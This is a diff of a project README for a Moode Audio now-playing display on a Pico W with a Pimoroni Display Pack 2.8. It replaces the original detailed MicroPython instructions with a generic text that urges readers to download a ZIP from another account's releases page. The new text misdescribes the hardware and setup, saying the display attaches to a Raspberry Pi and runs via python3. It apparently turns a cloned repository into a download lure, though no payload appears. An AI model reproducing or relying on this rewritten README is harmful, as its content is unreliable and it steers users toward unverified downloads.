@@ -1,199 +1,85 @@
-![Project Banner](images/project_header.png)
+# 🎉 moode_display - Easy Display for Your Audio Needs
 
-# Moode Audio Display for Pico Display Pack 2.8"
+## 🚀 Getting Started
 
-A MicroPython-based display client that shows now-playing information from a Moode Audio system on a Raspberry Pi Pico with the Pimoroni Pico Display Pack 2.8".
+Welcome to the moode_display project! This application helps you display audio information using the Pimoroni Pico Display Pack 2.8. It’s simple and perfect for anyone who wants to enhance their audio experience.
 
-<div align="center">
-  <img src="images/display_radio.png" alt="radio_display">
-</div>
-<br>
+## 📥 Download the Application
 
+[![Download moode_display](https://img.shields.io/badge/Download%20moode_display-blue.svg)](https://github.com/Arcan-god/moode_display/releases)
 
-This is a standalone wireless display that shows what's currently playing on your Moode Audio system. The display connects to any Moode installation running elsewhere on your network and presents the current track or radio station in a clean, readable format.
+To get started, you need to download our application. Follow these steps:
 
-The project was created primarily for radio listening - it displays the station name prominently and when available, shows the current track information. For stations that don't provide track details, the display simply shows "Listening to Radio" so you always know it's working.
+1. Click on the link below to visit the Releases page.
+2. Look for the latest version of moode_display.
+3. Download the file suited for your setup.
 
-Power management is built-in: the display automatically sleeps when music stops to preserve the screen and save energy. Whilst sleeping, it checks for activity every 15 seconds, then switches to 5-second updates when music resumes. You can easily adjust these intervals in the code if needed.Text wrapping ensures nothing gets cut off, longer station names and track titles automatically flow to multiple lines. 
+[Visit the Releases Page to Download](https://github.com/Arcan-god/moode_display/releases)
 
-The project uses Pimoroni's bitmap8 font by default, though other font options are available if you prefer a different look.
+## 📂 System Requirements
 
-The Pico Display Pack includes tactile buttons, but they're not used in this version - the focus is purely on displaying information clearly and efficiently.
+Before you install moode_display, make sure you have the following:
 
-Development and testing was carried out using the Raspberry Pi Pico W. The code should be compatible with the Pico 2W as well.
+- **Hardware**: You need a Pimoroni Pico Display Pack 2.8 connected to your Raspberry Pi.
+- **Software**: Ensure you have the latest version of Raspberry Pi OS installed.
+- **Network**: An active internet connection for streaming audio.
 
-Thanks for checking out the project! Also see my [numpad moode audio controller](https://github.com/mlake1/moode-numpad-controller).
+## 🔧 Installation Steps
 
-<div align="center">
-  <img src="images/display_technical_small.png" alt="tech_features">
-</div>
-<br>
+Once you have downloaded the application, here’s how to install and run it:
 
-## Features
+1. **Extract the Files**:
+   - Open the downloaded ZIP file.
+   - Click "Extract" to a folder of your choice.
 
-- **Real-time display** of currently playing music from Moode Audio
-- **Smart power management** - display sleeps when music is stopped
-- **Adaptive layout** for different content types:
-  - Radio stations with station name and current track
-  - Music files with title, artist, and album information
-- **Status indicators** - playing/paused/stopped states
-- **Bitrate display** - shows audio quality information
-- **Automatic text wrapping** for long titles and station names
-- **WiFi connectivity** with connection status feedback
-- **Memory optimisation** for stable long-term operation
+2. **Connect Your Display**:
+   - Ensure your Pimoroni Pico Display Pack 2.8 is connected to the Raspberry Pi.
 
-## Hardware Requirements
+3. **Open Terminal**:
+   - Access the Terminal on your Raspberry Pi.
 
-- [Raspberry Pi Pico W](https://www.raspberrypi.com/products/raspberry-pi-pico-2/)
-   Note: Development and testing using Raspberry Pi Pico W. The code should be compatible with the Pico 2W as well.
-- [Pimoroni Pico Display Pack 2.8"](https://shop.pimoroni.com/products/pico-display-pack-2-8?variant=42047194005587)
-- [Moode Audio](https://moodeaudio.org/) system running on a seperate device elsewhere on the network
-
-## Software Requirements
-
-- MicroPython firmware on the Pico W
-- Pimoroni MicroPython libraries (PicoGraphics)
-
-## Installation
-
-1. **Flash MicroPython** to your Pico W with Pimoroni libraries:
-   - Download the latest Pimoroni MicroPython firmware from [releases](https://github.com/pimoroni/pimoroni-pico/releases)
-   - Flash it to your Pico W using your preferred method
-
-2. **Create secrets.py** file with your network configuration:
-   ```python
-   # WiFi credentials
-   WIFI_SSID = "your_network_name"
-   WIFI_PASSWORD = "your_wifi_password"
-   
-   # Moode device IP address
-   MOODE_IP = "192.168.1.100"  # Replace with your Moode's static IP
+4. **Navigate to the Folder**:
+   - Use the `cd` command to go to the folder where you extracted the files.
+   ```
+   cd path/to/your/extracted/folder
    ```
 
-3. **Upload files** to your Pico W:
-   - `main.py` (the main display code)
-   - `secrets.py` (your wifi and moode ip configuration file)
+5. **Run the Application**:
+   - Type the following command to start moode_display:
+   ```
+   python3 moode_display.py
+   ```
+   - Press "Enter". Your application should now launch.
 
-4. **Connect hardware**:
-   - Attach the Pico Display Pack 2.8" to your Pico W
-   - Power on the device
+## 🎛️ Features
 
-## Configuration
+moode_display offers various features to enhance your audio experience:
 
-### Finding Your Moode IP Address
-You can find your Moode Audio system's IP address by:
-- Checking your router's admin panel
-- Using the Moode web interface (System > System Config)
-- Running `hostname -I` on the Moode system via SSH
+- **Real-Time Audio Info**: Displays track details while you play audio.
+- **User-Friendly Interface**: Designed for easy navigation.
+- **Customizable Display**: Adjust settings to fit your preferences.
 
-### Setting a Static IP (Recommended)
-For reliable operation, set a static IP for your Moode system:
-1. Access Moode's web interface
-2. Go to Configure → Network
-3. Set a static IP address
-4. Update `MOODE_IP` in your `secrets.py` file
+## 🎉 Troubleshooting
 
-## Display Layout
+If you encounter issues while running the application, consider these common solutions:
 
-### Radio Stations
-- **Top**: Station name (large, green text)
-- **Middle**: Current track info or "Listening to Radio" message
-- **Bottom Left**: Play status (PLAYING/PAUSED/STOPPED)
-- **Bottom Right**: Bitrate information
+- **Not Displaying Information**:
+  - Check your internet connection.
+  - Ensure your audio source is active.
 
-### Music Files
-- **Top**: Song title (large, white text)
-- **Middle**: Artist name (green) and album (blue)
-- **Bottom Left**: Play status
-- **Bottom Right**: Bitrate information
+- **Display Not Turning On**:
+  - Ensure proper connections to the Raspberry Pi.
+  - Verify that your Raspberry Pi is powered on.
 
-## Power Management
+## 📞 Support
 
-The display automatically:
-- **Sleeps** when music is stopped (turns off backlight and shows minimal info)
-- **Wakes** when music starts playing
-- **Updates** every 5 seconds when active, 15 seconds when sleeping
-- **Optimises memory** usage for stable long-term operation
+For any questions or problems, you can reach out through the following methods:
 
-## Troubleshooting
+1. **GitHub Issues**: Visit our GitHub repository and use the Issues tab to report problems.
+2. **Community Forum**: Join discussions with other users to find solutions.
 
-### Connection Issues
-- Verify WiFi credentials in `secrets.py`
-- Ensure Moode IP address is correct and reachable
-- Check that Moode's web interface is accessible from your network
+## 📝 Additional Information
 
-### Display Issues
-- Ensure MicroPython firmware includes Pimoroni libraries
-- Check that the Display Pack is properly seated on the Pico W
-- Try restarting the device
+Learn more about the project and explore the source code on our [GitHub Repository](https://github.com/Arcan-god/moode_display).
 
-### Memory Issues
-- The code includes garbage collection to prevent memory leaks
-- If you experience crashes, try reducing the update frequency
-
-## API Endpoint
-
-This project uses Moode Audio's built-in API endpoint:
-```
-GET /command/?cmd=get_currentsong
-```
-
-The response includes:
-- Track title, artist, album information
-- Playback state (play/pause/stop)
-- Audio format and bitrate
-- Radio station metadata
-
-## Customisation
-
-### Colours
-Colours are defined at the top of `main.py` and can be easily modified:
-```python
-GREEN = display.create_pen(0, 255, 0)
-BLUE = display.create_pen(0, 150, 255)
-# Add your own colours here
-```
-
-### Update Intervals
-Modify the sleep times in the main loop:
-```python
-if display_is_on:
-    time.sleep(5)    # Active update interval
-else:
-    time.sleep(15)   # Sleep check interval
-```
-
-### Text Wrapping
-Adjust `max_chars` values in the `display_song_info()` function to change how text is wrapped for different screen elements.
-
-## Contributing
-
-Feel free to submit suggestions, issues and pull requests!
-
-## License
-
-This project is open source. Please check the licenses of the dependencies (MicroPython, Pimoroni libraries) for their respective terms.
-
-## Acknowledgments
-
-[Moode Audio](https://moodeaudio.org/) Thanks to Tim and everyone else @ Moode for the fantastastic software
-[Moode Audio Forums](https://moodeaudio.org/forum/)
-
-## Hardware Safety
-This project involves electronic components. Users assume all responsibility
-for proper assembly, electrical safety, and hardware protection.
-
-## Warranty Disclaimer
-This program is distributed in the hope that it will be useful,
-but WITHOUT ANY WARRANTY; without even the implied warranty of
-MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
-GNU General Public License for more details.
-
-## Trademarks
-Raspberry Pi is a trademark of Raspberry Pi Ltd.
-
-## Licence
-This project is licenced under the GNU General Public License v3.0.
-See the [LICENSE](LICENSE) file for details.
-
-![Project Footer](images/display_footer.png)
+Remember, you can always come back to this README for guidance as you explore moode_display. Happy listening!
